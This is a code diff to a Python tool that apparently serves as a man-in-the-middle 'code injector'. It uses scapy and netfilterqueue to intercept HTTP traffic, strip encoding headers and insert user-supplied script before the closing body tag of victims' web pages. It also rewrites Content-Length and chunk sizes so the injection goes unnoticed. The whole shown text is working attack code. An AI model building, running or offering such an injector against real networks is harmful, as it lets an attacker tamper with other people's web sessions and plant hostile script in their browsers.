@@ -48,83 +48,76 @@ def process_packets(packet):
 
         if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
             load = scapy_packet[Raw].load
-
             if scapy_packet[TCP].dport == 80:
                 load = re.sub(b"(?:Accept-Encoding|Upgrade-Insecure-Requests|grade-Insecure-Requests):.*?\r\n",
                               b"", load)
-                req_ack.append(scapy_packet[TCP].ack)
+                if scapy_packet[TCP].ack not in req_ack:
+                    req_ack.append(scapy_packet[TCP].ack)
+                modified_packet = set_load(scapy_packet, load)
+                packet.set_payload(bytes(modified_packet))
+                packet.accept()
+                print("[+] REQUEST")
 
-            elif scapy_packet[TCP].sport == 80:
-                load = modify_content_length(load)
-                load = modify_chunks(scapy_packet, load)
+            if scapy_packet[TCP].sport == 80:
+                print("[+] RESPONSE")
+                injection_code = b"\n" + arguments.inject.encode(errors="ignore") + b"\n"
+                injection_code_length = len(injection_code)
 
-            if load != scapy_packet[Raw].load:
-                modified_payload = set_load(scapy_packet, load)
-                packet.set_payload(bytes(modified_payload))
+                if load and scapy_packet[TCP].seq in req_ack and b'200 OK' in load and b'Content-Length' in load:
+                    load = modify_content_length(load, injection_code)
+                    modified_packet = set_load(scapy_packet, load)
+                    packet.set_payload(bytes(modified_packet))
+                    packet.accept()
+                    req_ack.remove(scapy_packet[TCP].seq)
+
+                elif load and scapy_packet[TCP].seq in req_ack and b'200 OK' in load and b'Transfer-Encoding: chunked' in load:
+                    find_chunk = load.find(b'\r\n\r\n')
+                    chunk_start = load[find_chunk + len(b'\r\n\r\n'):]
+                    chunk_data_start = chunk_start.find(b'\r\n')
+                    hex_data = chunk_start[:chunk_data_start]
+                    hex_data_value = int(hex_data, 16)
+                    hex_data_value = hex_data_value + injection_code_length
+                    hex_data_value = hex(hex_data_value)[2:].encode(errors="ignore")
+                    load = load.replace(hex_data, hex_data_value)
+                    res_ack.append(scapy_packet[TCP].ack)
+                    req_ack.remove(scapy_packet[TCP].seq)
+                    modified_packet = set_load(scapy_packet, load)
+                    packet.set_payload(bytes(modified_packet))
+                    packet.accept()
+
+                elif load and scapy_packet[TCP].ack in res_ack and b'\n\r\n0\r\n\r\n' not in load:
+                    modified_packet = set_load(scapy_packet, load)
+                    packet.set_payload(bytes(modified_packet))
+                    packet.accept()
+
+                elif load and scapy_packet[TCP].ack in res_ack and b'\n\r\n0\r\n\r\n' in load:
+                    load = load.replace(b'</body>', injection_code + b"</body>")
+                    modified_packet = set_load(scapy_packet, load)
+                    packet.set_payload(bytes(modified_packet))
+                    packet.accept()
+
+                else:
+                    packet.accept()
+
+        else:
+            packet.accept()
 
     except Exception as e:
         handle_exception(e)
-    finally:
-        packet.accept()
 
 
-def modify_content_length(load):
+def modify_content_length(load, injection_code):
     if load:
-        injection_code = b"\n" + arguments.inject.encode(errors="ignore") + b"\n"
-        load = load.replace(b"</body>", injection_code + b"</body>")
         content_length_search = re.search(b"Content-Length:\s(\d*)", load)
         if content_length_search and b"text/html" in load:
+            load = load.replace(b"</body>", injection_code + b"</body>")
             content_length = content_length_search.group(1)
             new_content_length = str(int(content_length) + len(injection_code)).encode(errors="ignore")
             load = load.replace(content_length, new_content_length)
             return load
         else:
             return load
-
-
-def modify_chunks(packet, load):
-    if packet[TCP].seq in req_ack and b'200 OK' in load and b'Transfer-Encoding: chunked' in load:
-        res_ack.append(packet[TCP].ack)
-
-    if packet[TCP].ack in res_ack:
-        first_chunk_exists = re.search(b'\r\n\r\n', load)
-        last_chunk_exists = re.search(b'\n\r\n0\r\n\r\n', load)
-
-        if first_chunk_exists:
-            find_chunk = load.find(b'\r\n\r\n')
-            chunk_start = load[find_chunk + len(b'\r\n\r\n'):]
-            chunk_data_start = chunk_start.find(b'\r\n')
-            chunk_data = chunk_start[chunk_data_start + len(b'\r\n'):]
-            if chunk_data not in buffer_chunks:
-                buffer_chunks.append(chunk_data)
-
-        if last_chunk_exists:
-            find_chunk = load.find(b'\n\r\n0\r\n\r\n')
-            chunk_data = load[:find_chunk]
-            if chunk_data not in buffer_chunks:
-                buffer_chunks.append(chunk_data)
-
-        if not first_chunk_exists and not last_chunk_exists:
-            if load not in buffer_chunks:
-                buffer_chunks.append(load)
-
-    buffer = b''.join(buffer_chunks)
-    print(buffer)
-
-    if b'</body>' in buffer:
-        injection_code = b"\n" + arguments.inject.encode(errors="ignore") + b"\n"
-        load = buffer.replace(b'</body>', injection_code + b"</body>")
-        print(load)
-        return load
-    else:
-        return load
-
-
-def handle_exception(exception):
-    print("\n\n[!] An error occurred: ", str(exception) + "\n\n")
-    traceback.print_exc()
-    print("\n\n[-] Terminating session")
-    sys.exit(1)
+    return load
 
 
 def queue_packets():
@@ -141,14 +134,23 @@ def queue_packets():
         cleanup()
 
 
+def handle_exception(exception):
+    print("\n\n[!] An error occurred: ", str(exception) + "\n\n")
+    traceback.print_exc()
+    print("\n\n[-] Terminating session")
+    sys.exit(1)
+
+
 def cleanup():
     subprocess.call(["sudo", "iptables", "--flush"])
     print("[-] Flushing iptables")
     print("[-] Code injector ended successfully!")
 
 
-buffer_chunks = []
+buffer_chunks_list = []
 req_ack = []
+res_seq = []
 res_ack = []
+given_chunks_hex = []
 arguments = get_arguments()
 queue_packets()
